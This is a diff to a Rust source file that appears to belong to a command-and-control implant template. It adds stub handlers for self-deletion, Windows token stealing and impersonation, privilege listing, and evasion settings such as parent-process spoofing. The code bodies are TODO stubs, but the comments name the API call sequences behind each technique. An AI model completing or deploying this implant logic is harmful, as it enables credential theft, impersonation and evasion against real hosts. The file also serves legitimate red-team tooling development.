@@ -13,6 +13,15 @@
 use crate::protocol;
 use crate::agent::Agent;
 
+// ── Token vault entry ──────────────────────────────────────────────────────────
+
+pub struct TokenEntry {
+    pub id: i32,
+    pub handle: usize,  // raw HANDLE on Windows, unused on Unix
+    pub domain: String,
+    pub username: String,
+}
+
 /// Protocol-neutral view of a decoded task.
 ///
 /// Base templates do not dictate how bytes are framed on the wire. A protocol
@@ -66,6 +75,14 @@ pub fn dispatch(agent: &mut Agent, cmd_code: u32, cmd_id: u32, data: &[u8]) -> O
         protocol::COMMAND_EXEC_BOF_ASYNC => cmd_exec_bof_async(agent, cmd_id, data),
         protocol::COMMAND_JOB_LIST      => cmd_job_list(agent, cmd_id, data),
         protocol::COMMAND_JOB_KILL      => cmd_job_kill(agent, cmd_id, data),
+        protocol::COMMAND_SELFDEL       => cmd_selfdel(agent, cmd_id, data),
+        protocol::COMMAND_TOKEN_STEAL   => cmd_token_steal(agent, cmd_id, data),
+        protocol::COMMAND_TOKEN_MAKE    => cmd_token_make(agent, cmd_id, data),
+        protocol::COMMAND_TOKEN_IMPERSONATE => cmd_token_impersonate(agent, cmd_id, data),
+        protocol::COMMAND_TOKEN_LIST    => cmd_token_list(agent, cmd_id, data),
+        protocol::COMMAND_TOKEN_REMOVE  => cmd_token_remove(agent, cmd_id, data),
+        protocol::COMMAND_TOKEN_PRIVS   => cmd_token_privs(agent, cmd_id, data),
+        protocol::COMMAND_CONFIG        => cmd_config(agent, cmd_id, data),
         _ => None,
     }
 }
@@ -74,6 +91,9 @@ pub fn dispatch(agent: &mut Agent, cmd_code: u32, cmd_id: u32, data: &[u8]) -> O
 
 fn cmd_terminate(agent: &mut Agent) -> Option<Vec<u8>> {
     agent.active = false;
+    // NOTE: Protocol overlays MUST return Some(...) with the actual command code
+    // so the server's ProcessData fires TsAgentTerminate. Returning None here is
+    // only acceptable because protocol overlays replace this file entirely.
     None
 }
 
@@ -276,5 +296,84 @@ fn cmd_job_kill(agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>
     // Response: RESP_COMPLETE
     let _ = agent;
     // TODO: Read job_id from data via protocol overlay unpacker
+    None
+}
+
+// ── Self-delete ────────────────────────────────────────────────────────────────
+
+fn cmd_selfdel(agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
+    // Unpack: (none)
+    // Action: Windows — ADS rename + NtSetInformationFile(FileDispositionInformationEx)
+    //         Unix    — std::fs::remove_file(current_exe)
+    // Then set agent.active = false
+    // Response: RESP_COMPLETE
+    agent.active = false;
+    // TODO: Implement platform-specific self-delete via evasion gate
+    None
+}
+
+// ── Token vault ────────────────────────────────────────────────────────────────
+
+fn cmd_token_steal(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
+    // Unpack: pid (int64)
+    // Action: OpenProcess → OpenProcessToken → DuplicateTokenEx → ImpersonateLoggedOnUser
+    //         Store in agent.token_vault with auto-incremented id
+    // Response: AnsTokenSteal{Id int, Domain string, Username string}
+    // TODO: Implement — Windows only
+    None
+}
+
+fn cmd_token_make(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
+    // Unpack: domain (string), username (string), password (string)
+    // Action: LogonUserW(LOGON32_LOGON_NEW_CREDENTIALS) → ImpersonateLoggedOnUser
+    //         Store in agent.token_vault
+    // Response: AnsTokenMake{Id int, Domain string, Username string}
+    // TODO: Implement — Windows only
+    None
+}
+
+fn cmd_token_impersonate(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
+    // Unpack: id (int64)
+    // Action: Find token in vault by id → ImpersonateLoggedOnUser
+    // Response: AnsTokenImpersonate{Id int, Domain string, Username string}
+    // TODO: Implement — Windows only
+    None
+}
+
+fn cmd_token_list(agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
+    // Unpack: (none)
+    // Action: Format agent.token_vault entries
+    // Response: AnsTokenList{List string}
+    let _ = agent;
+    // TODO: Serialize via protocol overlay packer
+    None
+}
+
+fn cmd_token_remove(agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
+    // Unpack: id (int64)
+    // Action: CloseHandle(token.handle) + remove from vault
+    // Response: RESP_COMPLETE
+    let _ = agent;
+    // TODO: Read id from data via protocol overlay unpacker
+    None
+}
+
+fn cmd_token_privs(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
+    // Unpack: (none)
+    // Action: OpenThreadToken/OpenProcessToken → GetTokenInformation(TokenPrivileges)
+    //         LookupPrivilegeNameW for each privilege entry
+    // Response: AnsTokenPrivs{List string}
+    // TODO: Implement — Windows only
+    None
+}
+
+// ── Runtime config ─────────────────────────────────────────────────────────────
+
+fn cmd_config(agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
+    // Unpack: sub_cmd (int64), int_value (int64), str_value (string)
+    // Action: 1=ppid_spoof, 2=block_dlls, 3=spawn_to
+    // Response: AnsConfig{SubCmd int, IntValue int, StrValue string}
+    let _ = agent;
+    // TODO: Read sub_cmd from data via protocol overlay unpacker
     None
 }
